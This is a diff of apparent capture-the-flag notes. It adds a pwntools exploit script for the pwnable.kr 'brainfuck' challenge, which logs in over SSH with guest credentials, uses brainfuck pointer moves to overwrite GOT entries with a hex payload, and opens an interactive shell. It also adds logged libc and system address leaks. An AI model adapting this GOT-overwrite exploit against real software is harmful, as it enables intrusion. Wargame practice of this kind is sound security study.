@@ -2,6 +2,28 @@
 from pwn import *
 
 context.log_level = 'debug'
+session = ssh(user='brainfuck', host='pwnable.kr', port=2222, password='guest')
+p = session.process('./brainfuck')
+
+output = p.recvuntil(b"type some brainfuck instructions except [ ]\n")
+print(output.decode(errors='ignore'), end='')
+
+bf_code = ',>' * 10 + ',' + '<' * (10 + 148) + ',>' * 3 + ',' + ','
+print(bf_code)
+p.sendline(bf_code.encode())
+
+payload = bytes.fromhex("ff352b8bedf7e86551dcf7" + "0804a0a0")
+print(payload)
+p.send(payload)
+
+p.interactive()
+session.close()
+```
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
 context(os='linux', arch='i386')
 
 # Connect via SSH
@@ -79,4 +101,12 @@ log.info("libc base  : " + hex(libc_base))
 log.info("system_addr: " + hex(system_addr))
 log.info("gets_addr  : " + hex(gets_addr))
 log.info("main_addr  : " + hex(main_addr))
+```
+
+```
+[*] fgets_addr : 0xf7dde6c0
+[*] libc base  : 0xf7d80560
+[*] system_addr: 0xf7dbb310
+[*] gets_addr  : 0xf7ddf950
+[*] main_addr  : 0x8048671
 ```
